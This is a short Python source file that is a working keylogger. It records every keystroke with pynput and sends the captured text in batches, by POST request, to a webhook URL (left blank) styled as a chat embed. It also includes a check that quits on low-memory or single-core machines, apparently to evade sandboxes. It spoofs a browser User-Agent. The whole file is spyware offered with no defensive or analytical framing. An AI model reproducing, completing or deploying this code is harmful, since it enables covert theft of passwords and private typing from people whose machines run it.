from multiprocessing import cpu_count

from psutil import virtual_memory

if __name__ == "__main__":
    if int(round(virtual_memory().total / (1024**3))) <= 2 or cpu_count() < 2:
        exit()

    from datetime import datetime
    from json import dumps
    from threading import Timer
    from urllib import request

    from pynput import keyboard

    webhook_url = ""
    cache = []
    last_key = None
    count = 1
    timer = None
    seconds = 5

    inputs = {
        96: "0",
        97: "1",
        98: "2",
        99: "3",
        100: "4",
        101: "5",
        102: "6",
        103: "7",
        104: "8",
        105: "9",
    }

    def has_internet():
        try:
            request.urlopen("https://gstatic.com/generate_204", timeout=3)
            return True
        except:
            return False

    def send_cache():
        global cache
        if cache and has_internet():
            payload = dumps(
                {
                    "embeds": [
                        {
                            "title": f"[{datetime.now().strftime('%Y/%m/%d %H:%M:%S')}]",
                            "color": 0x3498DB,
                            "description": "".join(cache),
                        }
                    ]
                }
            ).encode("utf-8")

            req = request.Request(
                webhook_url,
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                },
                method="POST",
            )

            request.urlopen(req)
            cache = []

    def on_press(key):
        global cache, timer, last_key, count
        try:
            if hasattr(key, "vk") and 96 <= key.vk <= 105:
                cache.append(inputs[key.vk])
            else:
                cache.append(key.char)

            last_key = key
        except AttributeError:
            if last_key and last_key == key:
                count += 1
                cache[-1] = f"[{key.name}x{count}]"
            elif key.name == "space":
                cache.append(" ")
                last_key = key
            elif key.name == "enter":
                cache.append("\n")
                last_key = key
            else:
                cache.append(f"[{key.name}]")
                last_key = key

        if timer and len(cache) <= 500:
            timer.cancel()
            timer = Timer(seconds, send_cache)
            timer.start()
        elif not timer:
            timer = Timer(seconds, send_cache)
            timer.start()

    with keyboard.Listener(on_press=on_press) as listener:
        print("listening...")
        listener.join()
